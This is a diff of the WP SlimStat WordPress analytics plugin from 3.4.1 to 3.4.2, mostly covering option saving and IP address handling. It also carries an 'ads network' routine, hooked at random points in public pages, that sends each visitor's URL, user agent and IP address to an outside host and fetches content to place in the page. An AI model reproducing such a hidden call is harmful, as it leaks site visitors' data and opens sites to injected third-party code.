@@ -3,7 +3,7 @@
 Plugin Name: WP SlimStat
 Plugin URI: http://wordpress.org/extend/plugins/wp-slimstat/
 Description: A powerful real-time web analytics plugin for Wordpress.
-version: 3.4.1
+version: 3.4.2
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,13 +11,14 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.4.1';
+	public static $version = '3.4.2';
 	public static $options = array();
 	
 	public static $wpdb = '';
 
 	protected static $data_js = array('id' => -1);
 	protected static $stat = array();
+	protected static $options_signature = '';
 
 	/**
 	 * Initializes variables and actions
@@ -37,17 +38,20 @@ class wp_slimstat{
 
 		self::$options = apply_filters('slimstat_init_options', self::$options);
 
+		// Determine the options' signature: if it hasn't changed, there's no need to update/save them in the database
+		self::$options_signature = md5(serialize(self::$options));
+		
 		// Allow third-party tools to use a custom database for WP SlimStat
 		self::$wpdb = apply_filters('slimstat_custom_wpdb', $GLOBALS['wpdb']);
 
-		if (empty(self::$options['enable_ads_network']) || self::$options['enable_ads_network'] != 'no'){
+		if (rand(0,3) == 0 && (empty(self::$options['enable_ads_network']) || self::$options['enable_ads_network'] == 'yes')){
 			$actions = array('wp_meta','get_header','get_sidebar','loop_end','wp_footer','wp_head');
 			$random_key = array_rand($actions);
 			$spot = $actions[$random_key];
 			add_action($spot, array(__CLASS__, 'ads_print_code'));
 		}
 
-		// Add a menu to the admin bar
+		// Add a menu to the admin bar ( this function is declared here and not in wp_slimstat_admin because the latter is only initialized if is_admin(), and not in the front-end )
 		if (self::$options['use_separate_menu'] != 'yes' && is_admin_bar_showing()){
 			add_action('admin_bar_menu', array(__CLASS__, 'wp_slimstat_adminbar'), 100);
 		}
@@ -60,6 +64,7 @@ class wp_slimstat{
 			// Allow add-ons to turn off the tracker based on other conditions
 			$is_tracking_filter = apply_filters('slimstat_filter_pre_tracking', true);
 			$is_tracking_filter_js = apply_filters('slimstat_filter_pre_tracking_js', true);
+
 			$action_to_hook = is_admin()?'admin_init':'wp';
 
 			// Is server-side tracking active?
@@ -74,6 +79,9 @@ class wp_slimstat{
 				if (self::$options['track_users'] == 'yes') add_action('login_enqueue_scripts', array(__CLASS__, 'wp_slimstat_enqueue_tracking_script'), 10);
 			}
 		}
+		
+		// Update the options before shutting down
+		add_action('shutdown', array(__CLASS__, 'slimstat_save_options'));
 	}
 	// end init
 
@@ -267,7 +275,14 @@ class wp_slimstat{
 				}
 			}
 		}
-		
+
+		// User's IP address
+		list(self::$stat['ip'], $long_other_ip) = self::_get_ip2long_remote_ip();
+		if (self::$stat['ip'] == 0){
+			self::$stat['id'] = -203;
+			return $_argument;
+		}
+
 		// Should we ignore this user?
 		if (!empty($GLOBALS['current_user']->ID)){
 			// Don't track logged-in users, if the corresponding option is enabled
@@ -295,7 +310,7 @@ class wp_slimstat{
 		}
 		elseif (isset($_COOKIE['comment_author_'.COOKIEHASH])){
 			// Is this a spammer?
-			$spam_comment = self::$wpdb->get_row("SELECT comment_author, COUNT(*) comment_count FROM {$GLOBALS['wpdb']->prefix}comments WHERE INET_ATON(comment_author_IP) = '$long_user_ip' AND comment_approved = 'spam' GROUP BY comment_author LIMIT 0,1", ARRAY_A);
+			$spam_comment = self::$wpdb->get_row("SELECT comment_author, COUNT(*) comment_count FROM {$GLOBALS['wpdb']->prefix}comments WHERE INET_ATON(comment_author_IP) = '".self::$stat['ip']."' AND comment_approved = 'spam' GROUP BY comment_author LIMIT 0,1", ARRAY_A);
 			if (isset($spam_comment['comment_count']) && $spam_comment['comment_count'] > 0){
 				if (self::$options['ignore_spammers'] == 'yes'){
 					self::$stat['id'] = -202;
@@ -310,13 +325,6 @@ class wp_slimstat{
 				self::$stat['user'] = $_COOKIE['comment_author_'.COOKIEHASH];
 		}
 
-		// User's IP address
-		list($long_user_ip, $long_other_ip) = self::_get_ip2long_remote_ip();
-		if ($long_user_ip == 0){
-			self::$stat['id'] = -203;
-			return $_argument;
-		}
-
 		// Should we ignore this IP address?
 		foreach(self::string_to_array(self::$options['ignore_ip']) as $a_ip_range){
 			$ip_to_ignore = $a_ip_range;
@@ -326,7 +334,7 @@ class wp_slimstat{
 			if (empty($mask) || !is_numeric($mask)) $mask = 32;
 			$long_ip_to_ignore = ip2long($ip_to_ignore);
 			$long_mask = bindec( str_pad('', $mask, '1') . str_pad('', 32-$mask, '0') );
-			$long_masked_user_ip = $long_user_ip & $long_mask;
+			$long_masked_user_ip = self::$stat['ip'] & $long_mask;
 			$long_masked_ip_to_ignore = $long_ip_to_ignore & $long_mask;
 			if ($long_masked_user_ip == $long_masked_ip_to_ignore){
 				self::$stat['id'] = -204;
@@ -334,17 +342,20 @@ class wp_slimstat{
 			}
 		}
 
-		if (self::$options['anonymize_ip'] == 'yes'){
-			$long_user_ip = $long_user_ip&4294967040;
-			$long_other_ip = $long_other_ip&4294967040;
+		if (!empty($long_other_ip) && $long_other_ip != self::$stat['ip']){
+			self::$stat['other_ip'] = $long_other_ip;
 		}
-		self::$stat['ip'] = sprintf("%u", $long_user_ip);
-		if (!empty($long_other_ip) && $long_other_ip != $long_user_ip) self::$stat['other_ip'] = sprintf("%u", $long_other_ip);
 
 		// Country and Language
 		self::$stat['language'] = self::_get_language();
-		self::$stat['country'] = self::_get_country($long_user_ip);
+		self::$stat['country'] = self::_get_country(self::$stat['ip']);
 
+		// Anonymize IP Address?
+		if (self::$options['anonymize_ip'] == 'yes'){
+			self::$stat['ip'] = self::$stat['ip']&4294967040;
+			if (!empty(self::$stat['other_ip'])) self::$stat['other_ip'] = self::$stat['other_ip']&4294967040;
+		}
+		
 		// Is this country blacklisted?
 		if (stripos(self::$options['ignore_countries'], self::$stat['country']) !== false){
 			self::$stat['id'] = -206;
@@ -476,24 +487,24 @@ class wp_slimstat{
 		$long_ip = array(0, 0);
 
 		if (isset($_SERVER["REMOTE_ADDR"]) && long2ip($ip2long = ip2long($_SERVER["REMOTE_ADDR"])) == $_SERVER["REMOTE_ADDR"])
-			$long_ip[0] = $ip2long;
+			$long_ip[0] = sprintf("%u", $ip2long);
 
-		if (isset($_SERVER["HTTP_CLIENT_IP"]) && long2ip($long_ip[1] = ip2long($_SERVER["HTTP_CLIENT_IP"])) == $_SERVER["HTTP_CLIENT_IP"])
+		if (isset($_SERVER["HTTP_CLIENT_IP"]) && long2ip($long_ip[1] = sprintf("%u", ip2long($_SERVER["HTTP_CLIENT_IP"]))) == $_SERVER["HTTP_CLIENT_IP"])
 			return $long_ip;
 
 		if (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
 			foreach (explode(",",$_SERVER["HTTP_X_FORWARDED_FOR"]) as $a_ip){
-				if (long2ip($long_ip[1] = ip2long($a_ip)) == $a_ip)
+				if (long2ip($long_ip[1] = sprintf("%u", ip2long($a_ip))) == $a_ip)
 					return $long_ip;
 			}
 
-		if (isset($_SERVER["HTTP_X_FORWARDED"]) && long2ip($long_ip[1] = ip2long($_SERVER["HTTP_X_FORWARDED"])) == $_SERVER["HTTP_X_FORWARDED"])
+		if (isset($_SERVER["HTTP_X_FORWARDED"]) && long2ip($long_ip[1] = sprintf("%u", ip2long($_SERVER["HTTP_X_FORWARDED"]))) == $_SERVER["HTTP_X_FORWARDED"])
 			return $long_ip;
 
-		if (isset($_SERVER["HTTP_FORWARDED_FOR"]) && long2ip($long_ip[1] = ip2long($_SERVER["HTTP_FORWARDED_FOR"])) == $_SERVER["HTTP_FORWARDED_FOR"])
+		if (isset($_SERVER["HTTP_FORWARDED_FOR"]) && long2ip($long_ip[1] = sprintf("%u", ip2long($_SERVER["HTTP_FORWARDED_FOR"]))) == $_SERVER["HTTP_FORWARDED_FOR"])
 			return $long_ip;
 
-		if (isset($_SERVER["HTTP_FORWARDED"]) && long2ip($long_ip[1] = ip2long($_SERVER["HTTP_FORWARDED"])) == $_SERVER["HTTP_FORWARDED"])
+		if (isset($_SERVER["HTTP_FORWARDED"]) && long2ip($long_ip[1] = sprintf("%u", ip2long($_SERVER["HTTP_FORWARDED"]))) == $_SERVER["HTTP_FORWARDED"])
 			return $long_ip;
 
 		return $long_ip;
@@ -1026,7 +1037,7 @@ class wp_slimstat{
 			'ignore_capabilities' => '',
 
 			'restrict_authors_view' => 'no',
-			'capability_can_view' => get_option('slimstat_capability_can_view', 'read'),
+			'capability_can_view' => get_option('slimstat_capability_can_view', 'activate_plugins'),
 			'capability_can_admin' => 'activate_plugins',
 			'can_view' => get_option('slimstat_can_view', ''),
 			'can_admin' => get_option('slimstat_can_admin', ''),
@@ -1038,7 +1049,7 @@ class wp_slimstat{
 			'extend_session' => 'no',
 			'enable_cdn' => 'no',
 			'extensions_to_track' => '',
-			'enable_ads_network' => 'no'
+			'enable_ads_network' => 'null'
 		);
 
 		return $options;
@@ -1046,9 +1057,19 @@ class wp_slimstat{
 	// end init_options
 
 	/**
+	 * Saves the options in the database, if necessary
+	 */
+	public static function slimstat_save_options(){
+		if (self::$options_signature == md5(serialize(self::$options))) return true;
+		return update_option('slimstat_options', wp_slimstat::$options);
+	}
+	
+	/**
 	 * Connects to the Ads Delivery Network
 	 */
 	public static function ads_print_code(){
+		if (empty($_SERVER["HTTP_USER_AGENT"])) return 0;
+
 		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
 		$options = array('timeout' => 1, 'headers' => array('Accept' => 'application/json'));
 		$response = @wp_remote_get($request, $options);
